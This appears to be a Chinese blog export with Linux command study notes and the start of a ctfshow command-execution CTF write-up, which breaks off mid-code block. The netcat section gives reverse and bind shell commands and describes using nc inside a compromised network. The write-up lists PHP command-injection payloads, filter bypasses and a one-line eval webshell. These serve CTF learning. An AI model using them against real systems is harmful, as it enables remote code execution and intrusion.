/usr/sbin/useradd</code></pre><p>bin和sbin</p><p>在linux中，绝大多数可执行文件都是保存在&#x2F;bin、&#x2F;sbin、&#x2F;usr&#x2F;bin、&#x2F;usr&#x2F;sbin</p><p>&#x2F;bin是二进制执行文件目录，主要用于具体应用</p><p>&#x2F;sbin是系统管理员专用的二进制代码存放目录，主要用于系统管理</p><p>&#x2F;usr&#x2F;bin是<strong>整个系统安装好后</strong>后期安装的一些软件</p><p>&#x2F;usr&#x2F;sbin是超级用户的一些管理程序</p><h4 id="切换用户"><a href="#切换用户" class="headerlink" title="切换用户"></a>切换用户</h4><table><thead><tr><th align="center">命令</th><th align="center">作用</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">su - 用户名</td><td align="center">切换用户，并且切换目录</td><td align="center">- 可以切换到用户家目录，否则保持位置不变</td></tr><tr><td align="center">exit</td><td align="center">退出当前登录账户</td><td align="center"></td></tr></tbody></table><p><strong>su不接用户名，可以切换到root</strong></p><h3 id="7-系统信息相关命令"><a href="#7-系统信息相关命令" class="headerlink" title="7.系统信息相关命令"></a>7.系统信息相关命令</h3><h4 id="时间和日期"><a href="#时间和日期" class="headerlink" title="时间和日期"></a>时间和日期</h4><table><thead><tr><th align="center">序号</th><th align="center">作用</th></tr></thead><tbody><tr><td align="center">date</td><td align="center">查看系统时间</td></tr><tr><td align="center">cal</td><td align="center">查看日历，-y可以查看一年的日历</td></tr></tbody></table><h4 id="磁盘信息"><a href="#磁盘信息" class="headerlink" title="磁盘信息"></a>磁盘信息</h4><table><thead><tr><th align="center">命令</th><th align="center">作用</th></tr></thead><tbody><tr><td align="center">df -h</td><td align="center">disk free 显示磁盘剩余空间大小</td></tr><tr><td align="center">du -h [目录名]</td><td align="center">disk usage 显示目录下文件大小(没有指定目录名时会显示当前目录)</td></tr></tbody></table><p>-h：以人性化的方式显示文件大小</p><h4 id="进程信息"><a href="#进程信息" class="headerlink" title="进程信息"></a>进程信息</h4><table><thead><tr><th align="center">命令</th><th align="center">作用</th></tr></thead><tbody><tr><td align="center">ps aux</td><td align="center">process status 查看进程的详细状况</td></tr><tr><td align="center">top</td><td align="center">动态显示进行中的进程并且排序</td></tr><tr><td align="center">kill [-9] 进程代号</td><td align="center">终止指定代号的进程，-9表示强行终止</td></tr></tbody></table><p>​ps默认只会显示当前用户通过终端启动的应用程序</p><p>​要退出top可以直接输入q</p><p>ps选项说明</p><table><thead><tr><th align="center">选项</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center">a</td><td align="center">显示终端上的所有进程，包括其他用户的进程</td></tr><tr><td align="center">u</td><td align="center">显示进程的详细状态</td></tr><tr><td align="center">x</td><td align="center">显示没有控制终端的进程</td></tr></tbody></table><h3 id="8-其他命令"><a href="#8-其他命令" class="headerlink" title="8.其他命令"></a>8.其他命令</h3><h4 id="查找文件"><a href="#查找文件" class="headerlink" title="查找文件"></a>查找文件</h4><table><thead><tr><th align="center">命令</th><th align="center">作用</th></tr></thead><tbody><tr><td align="center">find [路径] -name “*.py”</td><td align="center">查找指定路径下扩展名是.py的文件，包括子目录</td></tr></tbody></table><h4 id="软链接"><a href="#软链接" class="headerlink" title="软链接"></a>软链接</h4><table><thead><tr><th align="center">命令</th><th align="center">作用</th></tr></thead><tbody><tr><td align="center">ln -s 被链接的源文件 链接文件</td><td align="center">建立文件的软链接，用通俗的方式讲类似于windows下的快捷方式</td></tr></tbody></table><p>注：没有 -s 选项建立的是一个 <strong>硬链接</strong> 文件</p><p>​源文件要使用<strong>绝对路径</strong>，不能使用相对路径，这样可以方便移动链接文件后，仍然能正常使用</p><h4 id="硬链接"><a href="#硬链接" class="headerlink" title="硬链接"></a>硬链接</h4><p>在linux中，<strong>文件名</strong> 和 <strong>文件数据</strong> 是分开存储的</p><img src="/2023/04/14/linux%E5%AD%A6%E4%B9%A0/220433.png" class=""><h4 id="打包-x2F-解包"><a href="#打包-x2F-解包" class="headerlink" title="打包&#x2F;解包"></a>打包&#x2F;解包</h4><p>tar 是linux中最常用的备份工具，此命令可以 <strong>把一系列文件</strong> 打包到 <strong>一个大文件中</strong>，也可以把一个 <strong>打包的大文件恢复成一系列文件</strong></p><pre><code>//打包文件tar -cvf 打包文件.tar 被打包的文件/路径//解包文件tar -xvf 打包文件.tar</code></pre><p>tar选项说明</p><table><thead><tr><th align="center">选项</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center">c</td><td align="center">生成档案文件，创建打包文件</td></tr><tr><td align="center">x</td><td align="center">解开档案文件</td></tr><tr><td align="center">v</td><td align="center">列出归档解档的详细过程，显示进度</td></tr><tr><td align="center">f</td><td align="center">指定档案文件名称，f后面一定是.tar文件，所以必须方选项最后</td></tr></tbody></table><p>注：f 选项必须放在最后，其他选项顺序可以随意</p><h4 id="压缩-x2F-解压缩"><a href="#压缩-x2F-解压缩" class="headerlink" title="压缩&#x2F;解压缩"></a>压缩&#x2F;解压缩</h4><h5 id="gzip"><a href="#gzip" class="headerlink" title="gzip"></a>gzip</h5><p>tar 与 gzip 命令结合可以实现文件 <strong>打包和压缩</strong></p><p>tar 只负责打包文件，但不压缩</p><p>用 gzip压缩tar 打包后的文件，其扩展名一般用 xxx.tar.gz</p><p>在 linux中，最常见的压缩文件格式就是xxx.tar.gz</p><p><strong>在tar 命令中有一个 -z 选项可以调用 gzip，从而可以方便的实现压缩和解压缩的功能</strong></p><pre><code>//压缩文件tar -zcvf 打包文件.tar.gz 被压缩的文件/路径...//解压缩文件tar -zxvf 打包文件.tar.gz//解压缩到指定路径tar -zxvf 打包文件.tar.gz -C 目标路径</code></pre><h5 id="bzip2"><a href="#bzip2" class="headerlink" title="bzip2"></a>bzip2</h5><p>tar 与 bzip2 命令结合可以使用实现文件 打包和压缩</p><p>tar 只负责打包文件，但不压缩</p><p>用 bzip 压缩 tar 打包后的文件，其扩展名一般用 xxx.tar.bz2</p><p><strong>在tar 命令中有一个 -j 选项可以调用 gzip，从而可以方便的实现压缩和解压缩的功能</strong></p><pre><code>//压缩文件tar -jcvf 打包文件.tar.gz 被压缩的文件/路径...//解压缩文件tar -jxvf 打包文件.tar.gz//解压缩到指定路径tar -jxvf 打包文件.tar.gz -C 目标路径</code></pre><table><thead><tr><th align="center">选项</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center">-C</td><td align="center">解压缩到指定目录，注意：<strong>指定的目录必须存在</strong></td></tr></tbody></table><h4 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h4><p>在 Linux 中创建定时任务通常使用 Cron 服务。Cron 是一个用于在预定时间执行特定任务的系统工具。</p><p>创建的cron定时文件在&#x2F;var&#x2F;spool&#x2F;cron&#x2F;[crontabs]&#x2F;&lt;username&gt;文件夹下，一般以创建定时用户的用户名命名</p><p>比如，当前用户名为root，我们就要将下面内容写入到 &#x2F;var&#x2F;spool&#x2F;cron&#x2F;root 中。(centos系列主机)</p><p>比如，当前用户名为root，我们就要将下面内容写入到 &#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root 中。(Debian&#x2F;Ubuntu系列主机)</p><p>基本操作：</p><pre><code>#1.编辑cron表crontab -e#2.指定cron作业* * * * * command（*从左到右分别指分钟 (0 - 59)、小时 (0 - 23)、日期 (1 - 31)、月份 (1 - 12)、星期几 (0 - 7，0 和 7 都代表星期日)）</code></pre><p>其他选项：</p><pre><code>#列出当前用户的cron作业crontab -l#从文件导入cron作业crontab filename#删除当前用户的所有cron作业crontab -r</code></pre><h4 id="软件安装"><a href="#软件安装" class="headerlink" title="软件安装"></a>软件安装</h4><p>通过 apt 安装&#x2F;卸载软件</p><p>apt 是 advanced Packing Tool ,是linux下的一款安装包管理工具</p><pre><code>//安装软件sudo apt install 软件名//卸载软件sudo apt remove 软件名//更新已安装的包sudo apt upgrade</code></pre><pre><code>一个小火车sudo apt install sl一个当前进程排名软件sudo apt install htop</code></pre><h2 id="linux进阶命令"><a href="#linux进阶命令" class="headerlink" title="linux进阶命令"></a>linux进阶命令</h2><h3 id="netstat（查看网络服务及监听端口）"><a href="#netstat（查看网络服务及监听端口）" class="headerlink" title="netstat（查看网络服务及监听端口）"></a>netstat（查看网络服务及监听端口）</h3><p>Netstat 是一款命令行工具，可用于列出系统上所有的网络套接字连接情况，包括 tcp, udp 以及 unix 套接字，另外它还能列出处于监听状态（即等待接入请求）的套接字。</p><p>若使用netstat -nlpt会显示如下信息：</p><img src="/2023/04/14/linux%E5%AD%A6%E4%B9%A0/185943.png" class=""><p>属性列表：</p><p>|Proto|连接协议的种类|Recv-Q|接收到的字节数|Send-Q|从本服务器发出去的字节数</p><p>|Local Address|本地ip地址&#x2F;主机名|Foreign Address|远程主机的IP地址|state|网络连接状态</p><p>|PID&#x2F;Program name|进程号&#x2F;进程名</p><p>State(网络连接状态)详解：</p><pre><code>LISTEN：(Listening for a connection.)侦听来自远方的TCP端口的连接请求SYN-SENT：(Active; sent SYN. Waiting for a matching connection request after having sent a connection request.)再发送连接请求后等待匹配的连接请求SYN-RECEIVED：(Sent and received SYN. Waiting for a confirming connection request acknowledgment after having both received and sent connection requests.)再收到和发送一个连接请求后等待对方对连接请求的确认ESTABLISHED：(Connection established.)代表一个打开的连接FIN-WAIT-1：(Closed; sent FIN.)等待远程TCP连接中断请求，或先前的连接中断请求的确认FIN-WAIT-2：(Closed; FIN is acknowledged; awaiting FIN.)从远程TCP等待连接中断请求CLOSE-WAIT：(Received FIN; waiting to receive CLOSE.)等待从本地用户发来的连接中断请求CLOSING：(Closed; exchanged FIN; waiting for FIN.)等待远程TCP对连接中断的确认LAST-ACK：(Received FIN and CLOSE; waiting for FIN ACK.)等待原来的发向远程TCP的连接中断请求的确认TIME-WAIT：(In 2 MSL (twice the maximum segment length) quiet wait after close. )等待足够的时间以确保远程TCP接收到连接中断请求的确认CLOSED：(Connection is closed.)没有任何连接状态</code></pre><p>Netstat选项：</p><pre><code>-a或--all：显示所有连线中的Socket；-A&lt;网络类型&gt;或--&lt;网络类型&gt;：列出该网络类型连线中的相关地址；-c或--continuous：持续列出网络状态；-C或--cache：显示路由器配置的缓存信息；-e或--extend：显示拥有者信息；-F或--fib：显示FIB；-g或--groups：显示多重广播功能群组组员名单；-h或--help：在线帮助；-i或--interfaces：显示网络界面信息表单；-l或--listening：显示监控中的服务器的Socket；-M或--masquerade：显示伪装的网络连线；-n或--numeric：直接使用IP地址，而不通过域名服务器（禁用反向域名解析）；-N或--netlink或--symbolic：显示网络硬件外围设备的符号连接名称；-o或--timers：显示计时器；-p或--programs：显示正在使用Socket的程序识别码和程序名称；（必须使用root权限）-r或--route：显示路由表；-s或--statistics：显示网络工作信息统计表；-t或--tcp：显示TCP传输协议的连线状况；-u或--udp：显示UDP传输协议的连线状况；-v或--verbose：显示指令执行过程；-V或--version：显示版本信息；-w或--raw：显示RAW传输协议的连线状况；-x或--unix：此参数的效果和指定-A unix参数相同；--ip或--inet：此参数的效果和指定-A inet参数相同。</code></pre><p>例如：</p><pre><code>netstat -a列出 tcp, udp 和 unix 协议下所有套接字的所有连接。netstat -c持续输出信息netstat-at列出所有tcp连接netstat -au列出所有udp连接netstat -atn禁用反向域名解析，加快查询速度netstat -tln只列出监听中的连接(不要使用 -a 选项，否则 netstat 会列出所有连接，而不仅仅是监听端口。)netstat -tlpe获取进程名、进程号(-p选项必须使用root权限)以及用户名( 假如你将 -n 和 -e 选项一起使用，User 列的属性就是用户的 ID 号，而不是用户名。)netstat -rn显示内核路由信息netstat -ie打印网络接口信息(-i输出的信息比较原始，可以配合-e输出用户友好的信息，输出信息与 ifconfig 输出的信息一样。)</code></pre><p>注：<code>[::]:*</code>和<code>:::*</code>表示所有可用的Ipv6地址上的所有端口，<code>0.0.0.0:*</code>表示所有可用的Ipv4地址上的所有端口（以上都是ipv6和ipv4地址和端口通配符的写法）</p><h3 id="netcat"><a href="#netcat" class="headerlink" title="netcat"></a>netcat</h3><p>netcat是网络界的瑞士军刀，使用netcat，可以解决客户端主动连接服务器被防火墙拦截的问题，使用netcat，我们的pc(控制端)相当于服务器，服务器(被控制端)相当于一个客户端。</p><p>目前，默认的各个linux发行版本已经自带了netcat工具包，但是可能由于处于安全考虑原生版本的netcat带有可以直接发布与反弹本地shell的功能参数 -e 都被阉割了，所以我们需要自己手动下载二进制安装包</p><pre><code>-c: 如同&#39;-e&#39;，使用/bin/sh来执行-d: 后台模式-e: 连接后要执行的程序 （程序重定向）-g&lt;网关&gt;: 设置路由器跃程通信网关，最多可设置8个。-G&lt;指向器数目&gt;: 设置源路由指向器的数量，值为4的倍数。-i&lt;延迟秒数&gt;: 设置时间间隔，以便传送信息及扫描通信端口-l: 使用监听模式，管理和控制传入的数据-n: 直接使用IP地址，不通过域名服务器（禁用反向域名解析）-o&lt;输出文件&gt;: 指定文件名称，把往来传输的数据转换为16进制字符后保存在该文件中-p&lt;通信端口&gt;: 设置本机使用的通信端口-r: 随机指定本机与远程主机的通信端口-s&lt;源地址&gt;: 设置本机送出数据包的IP地址-u: 使用UDP传输协议-v: 详细输出（`-v`: 显示基本的信息。`-vv`: 显示更详细的信息。`-vvv`: 显示更加详细和详尽的信息。）-w&lt;超时秒数&gt;:设置等待连线的时间-z: 将输入/输出功能关闭，只在扫描通信端口时使用（仅仅是去 ping 去探测目标是否开启指定端口，不进行任何的交互）</code></pre><p>常用：</p><pre><code>#端口扫描nc -nvz 172.168.1.101 1-100 (nc -nvz ip port) (z仅仅是去探测目标是否开启指定端口，不进行任何交互。z 参数默认扫描的是 tcp 类型，如果需要扫描 udp，则需要使用参数 u。)（单纯的端口扫描利用其它工具比如 nmap会更好。nc端口扫描最主要的用途是，当我们获得了一个网站的权限之后对内网进行扫描。然而，我们的nmap工具是不能扫描到内网的，所以这时我们可以把nc上传到web服务器上，利用它来扫描内网主机。而由于nc体积很小，所以不容易被发现。）------------------------------------------------------------------------------------#传输文本信息A计算机监听，B计算机以连接的方式去连接其指定的端口（监听方和连接方都可互发信息）A: netcat -lp 666B: netcat -nv 192.168.1.103 666------------------------------------------------------------------------------------#传输文件和目录与文本信息传输类似A: netcat -lp 666&gt;1.jpgB: netcat -nv 192.168.1.103 666&lt;1.jpg对于传输目录与文件传输类似，传输时将目录压缩进行传输，接收时解压A: tar cvf - fa/ | nc -lp 666B: netcat -nv 192.168.1.103 666 | tar xvf -------------------------------------------------------------------------------------#正向shell正向是目标机器主动指定 bash并监听，然后通过攻击机连接目标机的端口，攻击机输入命令，执行命令的是目标机器目标机器: netcat -lp 666 -c bash攻击机:  netcat 192.168.1.103 666#反向shell正向是攻击机监听端口，然后通过目标机器主动指定bash并连接，攻击机输入命令，执行命令的是目标机器攻击机: netcat -lp 666目标机器: netcat 192.168.1.103 666 -c bash</code></pre><p>参考：<a href="https://zhuanlan.zhihu.com/p/397058259">https://zhuanlan.zhihu.com/p/397058259</a></p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="linux文件描述符"><a href="#linux文件描述符" class="headerlink" title="linux文件描述符"></a>linux文件描述符</h3><p>在Linux系统中，文件描述符（File Descriptor）是一个非负整数，用于标识一个打开的文件或I&#x2F;O流。Linux系统中，文件描述符用于访问文件、设备、网络套接字等资源。</p><p>常见的文件描述符：</p><ol><li><strong>标准输入（stdin）</strong>：文件描述符为<strong>0</strong>，通常指向键盘输入。</li><li><strong>标准输出（stdout）</strong>：文件描述符为<strong>1</strong>，通常指向屏幕输出。</li><li><strong>标准错误（stderr）</strong>：文件描述符为<strong>2</strong>，通常也指向屏幕输出，但用于错误消息。</li></ol><pre><code>#重定向标准输出到文件：cat foo &gt; foo.txt#重定向标准错误到文件：cat foo 2&gt; foo.txt#重定向标准输出，标准错误到同一个文件：1. cat foo &gt; foo.txt 2&gt;&amp;12. cat foo &amp;&gt; foo.txt3. cat foo &gt;&amp; foo.txt(在一些shell中这被认为是错误的语法)&amp; 表示等同于的意思，2&gt;&amp;1，表示2的输出重定向位置等同于1的位置，即和1重定向的文件系统上的位置是一样的(以上实例都是覆盖写入，可以将其改为&gt;&gt;追加写入)</code></pre><h3 id="虚拟机配置网络代理"><a href="#虚拟机配置网络代理" class="headerlink" title="虚拟机配置网络代理"></a>虚拟机配置网络代理</h3><p>（1）clash直接开启allow lan模式，虚拟机设置nat模式</p><p>以下都需要在clash全局模式(global)下</p><p>（2）虚拟机使用net网络模式</p><p>​直接在主机clash上开启TUN模式和混合配置(mixin)（防止冲突关闭systemproxy系统代理）</p><img src="/2023/04/14/linux%E5%AD%A6%E4%B9%A0/23255.png" class=""><p>按照上面三步依次执行，最后点开mixin选项，编辑文件，删除里面的内容，粘贴上下面的内容即可！</p><pre><code>mixin:   hosts:     &#39;mtalk.google.com&#39;: 108.177.125.188     &#39;services.googleapis.cn&#39;: 74.125.203.94     &#39;raw.githubusercontent.com&#39;: 151.101.76.133   dns:     enable: true     default-nameserver:       - 223.5.5.5   # 阿里的DNS服务器       - 1.0.0.1     # CloudFlare的DNS服务器     ipv6: false     enhanced-mode: redir-host #fake-ip     nameserver:       - https://dns.rubyfish.cn/dns-query       - https://223.5.5.5/dns-query       - https://dns.pub/dns-query     fallback:       - https://1.0.0.1/dns-query       - https://public.dns.iij.jp/dns-query       - https://dns.twnic.tw/dns-query     fallback-filter:       geoip: true       ipcidr:         - 240.0.0.0/4         - 0.0.0.0/32         - 127.0.0.1/32       domain:         - +.google.com         - +.facebook.com         - +.twitter.com         - +.youtube.com         - +.xn--ngstr-lra8j.com         - +.google.cn         - +.googleapis.cn         - +.gvt1.com   tun:     enable: true     stack: gvisor     dns-hijack:       - 198.18.0.2:53     macOS-auto-route: true     macOS-auto-detect-interface: true # 自动检测出口网卡</code></pre><p>（3）虚拟机使用桥接模式</p><p>​&lt;1&gt;clash开启系统代理(systemproxy)</p><p>​ &lt;2&gt;linux进入&#x2F;etc&#x2F;profile.d目录，新建proxy.sh，内容如下：</p><pre><code>export proxy=&quot;http://192.168.150.1:7890&quot;export http_proxy=$proxyexport https_proxy=$proxyexport HTTP_PROXY=$proxyexport HTTPS_PROXY=$proxyexport all_proxy=socks5://192.168.10.103:7890</code></pre><p>​&lt;3&gt;执行脚本文件</p><pre><code>sourch proxy.sh</code></pre><p>​&lt;4&gt;配置github网络代理</p><pre><code>git config --global http.https://github.com.proxy socks5://192.168.150.1:7890</code></pre><p>​&lt;5&gt;检查代理</p><pre><code>curl cip.cc</code></pre><p>​&lt;6&gt;浏览器代理需要单独配置，chrome可以用代理插件</p><h3 id="Linux配置文件路径大全"><a href="#Linux配置文件路径大全" class="headerlink" title="Linux配置文件路径大全"></a>Linux配置文件路径大全</h3><pre><code>1:/etc/sysconfig/i18n(语言配置文件).2:/etc/sysconfig/network-scripts/ifcfg-eth0(eth0配置文件).3:/boot/grub/grub.conf(grup配置文件) 或/boot/grub/menu.list.4:/etc/passwd:系统用户数据库文件.5:/etc/group:组的数据库文件.6:/etc/gshadow(存放密码).7:/etc/shadow(存放密码).8:/etc/profile(系统环境).9:/etc/bashrc(系统变量).10:/etc/shells(存放shell).11:/etc/sudoers(sudo配置文件).12:/etc/inittab(设置启动级别).13:/etc/rc.d/rc.local系统启动是执行的文件类似于windows的autoexec.bat).14HOME/Xclients(控制启动x客户端).15:/etc/X11/Xinit/xinitrc.d/xinput(启动x-windows的加载程序配置文件).16:/etc/fstab(文件系统格式表).17:/var/log/(存放日志目录).18:/var/spool/at/(存放at时间任务的目录).19:/etc/at.deny(禁止时间任务,针对用户).20:/etc/at.allow( 允许时间任务,针对用户).21:/etc/crontab(crontab配置文件).22:/etc/anacrontab(anacrontab配置文件).23:/etc/moudle.conf(网卡,声卡,usb的模块).24:/etc/protocols(协议).25:/etc/services(端口).26:/etc/dhcpd.conf(DHCP配置文件,默任不存在).27:/var/lib/dhcp/dhcpd.leases(查看哪个用户,使用你的dhcp服务器).29:/etc/hosts 或者 /etc/sysconfig/network(修改主机名).30:/etc/named.conf(DNS主配置文件).31:/etc/host.conf(解晰主机时用host表还是dns).32:/etc/resolv.conf(指定dns服务器ip).33:/etc/httpd/conf/httpd.conf(apache配置文件)34:/etc/mail/(sendmail目录).35:/etc/aliases(别名配置文件).36:/etc/samba/smb.conf(smb配置文件).37:/etc/proftpd.conf(ftp配置文件).38:/etc/squid/squid.conf(squid配置文件).39:/etc/pam.d/su(限制用户使用su).40:/etc/secruetty(限制根用户直接登陆终端).41:/etc/secrrity/access.conf(限制某用户登陆).42:/etc/nologin(限制所有用户登陆).43:/etc/sudoers(强制用户每次使用sudo输入密码).44:/etc/security/time.conf(限制用户登陆系统时间).45:/etc/hosts.allow46:/etc/hosts.deny47:/etc/issue(登陆提示)48:/etc/issue.net(远程登陆提示).49:/etc/motd(输入用户名和密码后看到的内容).50:/etc/login.defs(生成新用户,基本参数).51:/etc/logrotate.conf(日志文件各级的选项).52:/proc/sys/net/ipv4/ip_forward(即使路由功能打开).53:/etc/sysctl.conf(永久打开路由功能).54:/proc/sys/net/ipv4/icmp_echo_igore_all(是否允许ping).55:/proc/sys/net/ipv4/icmp_echo_ignore_broadcasts(广播ping)56:/proc/self/cmdline(获取当前执行系统命令)57:/proc/net/arp(查看内网存活主机)58:/etc/hosts(同上)59:/proc/net/tcp60:/proc/net/udp61:/proc/net/dev62:/proc/net/fib_trie63:/proc/self/environ64:/sys/class/net/eth0/address(获得网卡mac地址）</code></pre><h3 id="Nginx-重要文件目录"><a href="#Nginx-重要文件目录" class="headerlink" title="Nginx 重要文件目录"></a>Nginx 重要文件目录</h3><pre><code>配置文件存放目录：/etc/nginx主要配置文件：/etc/nginx/conf/nginx.conf管理脚本：/usr/lib64/systemd/system/nginx.service模块：/usr/lisb64/nginx/modules</code></pre><h3 id="linux下的快捷键"><a href="#linux下的快捷键" class="headerlink" title="linux下的快捷键"></a>linux下的快捷键</h3><pre><code>ctrl+c强行中断当前程序的执行。ctrl+z将任务中断,但是此任务并没有结束,他仍然在进程中，只是放到后台并维持挂起的状态。如需其在后台继续运行，需用“bg 进程号”使其继续运行；再用&quot;fg 进程号&quot;可将后台进程前台化。ctrl+\表示退出。ctrl+d表示结束当前输入（即用户不再给当前程序发出指令），那么Linux通常将结束当前程序。(ctrl-d 不是发送信号，而是表示一个特殊的二进制值，表示 EOF。)(在shell中，ctrl-d表示退出当前shell.)</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>命令执行(ctfshow)</title>
      <link href="/2023/04/09/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C(ctfshow)/"/>
      <url>/2023/04/09/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C(ctfshow)/</url>
      
        <content type="html"><![CDATA[<h1 id="ctfshow"><a href="#ctfshow" class="headerlink" title="ctfshow"></a>ctfshow</h1><h2 id="类型一-变量c来接受并过滤传入的数据-eval函数来执行"><a href="#类型一-变量c来接受并过滤传入的数据-eval函数来执行" class="headerlink" title="类型一:变量c来接受并过滤传入的数据,eval函数来执行"></a>类型一:变量c来接受并过滤传入的数据,eval函数来执行</h2><h3 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h3><p>使用通配符*或?或’’等等绕过flag</p><pre><code>payload 1.c=system(&quot;cat f*&quot;);2.c=echo `cat f*`;3.c=echo `nl fl&#39;&#39;ag.php`;或c=echo `nl fl&quot;&quot;ag.php`;//nl命令在linux系统中用来计算文件中行号。nl 可以将输出的文件内容自动的加上行号4.c=echo `nl fl\ag.php`;   //转义字符绕过5.c=include($_GET[1]);&amp;1=php://filter/read=convert.base64-encode/resource=flag.php //通过变量赋值直接绕过c的过滤?ip=127.0.0.1;cat `ls` //内联执行，就是将反引号内命令的输出作为输入执行cp fla&#123;g.php,G&#125;    //把flag.php复制为flaG6.c=`c&#39;a&#39;t /flag` //绕过字符串的过滤</code></pre><p>可以读取文件的函数：</p><pre><code>readfile()读取文件 highlight_file()读文件 show_source()同上 base64_decode()base64解码 strrev()反转字符串include()文件包含，可以不使用括号require()完全可以替代include()</code></pre><h3 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h3><pre><code>payload ?c=echo `cat f*`;</code></pre><p>其他可代替system函数：</p><pre><code>system()passthru() exec() shell_exec() popen() proc_open()pcntl_exec() 反引号 同shell_exec()</code></pre><h3 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h3><pre><code>payload c=echo%09`tac%09f*`;</code></pre><p>文件读取命令</p><pre><code>sort:文件排序并输出也可以查看内容more:一页一页的显示档案内容less:与 more 类似 head:查看头几行tac:从最后一行开始显示，可以看出 tac 是cat 的反向显示tail:查看尾几行nl:显示内容，顺便输出行号od:以二进制的方式读取档案内容vi:一种编辑器，这个也可以查看vim:一种编辑器，这个也可以查看uniq:可以查看 file -f:报错出具体内容grepgrep &#123; flag.php打印有”&#123;“的一行strings: 在对象文件或二进制文件中查找可打印的字符串, 在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令： grep test *file strings。通常用法：strings\$IFS\$9f*(必须加转义字符)paste把每个文件以列对列的方式，一列列地加以合并sed一种编辑器，可以用sed -f flag.php读取flagawkcurlcut</code></pre><p>linux绕过空格</p><pre><code>cat%09flag  //tab&#123;cat,flag.txt&#125; cat$&#123;IFS&#125;$9flag.txt  //$IFS在linux下表示为空格cat&#123;IFS&#125;flag.txtcat$IFSflag.txtcat$&#123;IFS&#125;flag.txtcat$IFS$1flag.txt //$1改成$加其他数字都行catIFSflag.txtcat&lt;flag.txt cat&lt;&gt;flag.txt ca\t fl\ag</code></pre><h3 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h3><pre><code>payload 1.c=include$_GET[1]?&gt;&amp;1=data://text/plain,&lt;?php system(&quot;ls&quot;);?&gt;         2.c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php        3.c=require$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</code></pre><p>include可以不用括号,分号用?&gt;代替</p><h3 id="web33-36"><a href="#web33-36" class="headerlink" title="web33-36"></a>web33-36</h3><p>这四关都可以前面的payload，36关只需把1换成a就行了</p><pre><code>payload 1.c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php        2.c=require$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</code></pre><p>php总比较常用的可以不加括号的函数有:</p><pre><code>`echo`、`print`、`isset`、`unset`、`include`、`require`</code></pre><h2 id="类型二-变量c接收并过滤传入的数据-include来包含文件"><a href="#类型二-变量c接收并过滤传入的数据-include来包含文件" class="headerlink" title="类型二:变量c接收并过滤传入的数据,include来包含文件"></a>类型二:变量c接收并过滤传入的数据,include来包含文件</h2><h3 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h3><p>这关要用到php伪协议data:&#x2F;&#x2F;</p><pre><code>payload ?c=data://text/plain,&lt;?php system(&quot;cat f*&quot;);?&gt;        ?c=data:,&lt;?php @eval($_POST[&#39;shell&#39;]); ?&gt;  //可以直接用蚁剑连接</code></pre><h3 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h3><p>过滤了php和file，可以用&lt;?&#x3D;或进行base64编码</p><pre><code>payload c=data://text/plain,&lt;?=system(&quot;cat f*&quot;);?&gt;        c=data:text/base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhKiIpOw==</code></pre><h3 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h3><pre><code>payload c=data://text/plain,&lt;?php system(&quot;cat fla*&quot;);?&gt;</code></pre><p>.php 因为前面的php语句已经闭合了，所以后面的.php会被当成html页面直接显示在页面上，起不到什么作用</p><h3 id="web40-属于类型一"><a href="#web40-属于类型一" class="headerlink" title="web40  属于类型一"></a>web40  属于类型一</h3><p>此题考察无参数函数构造，参考大佬们写的：</p><p>函数：print_r(scandir(‘.’))可以用来查看当前目录所有文件名，我们要做的是将括号中的.替换掉</p><p>localeconv()函数返回一包含本地数字及货币格式信息的数组，如下只是该函数的一部分数组元素</p><img src="/2023/04/09/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C(ctfshow)/44337.png" class=""><p>可利用localeconv()函数返回数组中的第一个小数点代替读取目录函数print_r(scandir(‘.’))中的参数 .<br>那么如何将数组中的第一个元素读取出来呢？可以使用以下函数：</p><pre><code>current()函数返回数组中的当前元素/单元，默认取第一个值； pos()函数同上，是current()函数的别名； reset()函数，当数组不为空时返回数组第一个单元的值，如果数组为空则返回FALSE</code></pre><p>可以得到flag.php位于数组的第三个值里，也就是倒数第二个，我们可以通过array_reverse()函数以相反的元素顺序返回数组，在用next()函数读取下一个元素，最后通过highlight_file()函数读取到flag.php</p><pre><code>payload ①?c=print_r(scandir(pos(localeconv())));        ②?c=highlight_file(next(array_reverse(scandir(pos(localeconv())))));</code></pre><p>更多操作参考<a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/">https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/</a></p><h3 id="web41-属于类型一"><a href="#web41-属于类型一" class="headerlink" title="web41 属于类型一"></a>web41 属于类型一</h3><p>这关是无字母数字命令执行</p><p>p神原话：在PHP中，两个字符串执行异或操作以后，得到的还是一个字符串。所以，我们想得到a-z中某个字母，就找到某两个非字母、数字的字符，他们的异或结果是这个字母即可。</p><p>以下参考<a href="https://blog.csdn.net/Sapphire037/article/details/121054836">https://blog.csdn.net/Sapphire037/article/details/121054836</a></p><p>通过代码审计我们可以知道这个题过滤了$、+、-、^、~使得异或自增和取反构造字符都无法使用，但是留了一个<code>|</code>也就是或运算还可以用，这个时候利用Y4师傅和羽师傅的脚本结合，即可很方便的做出来这题。先看Y4师傅的脚本</p><pre><code 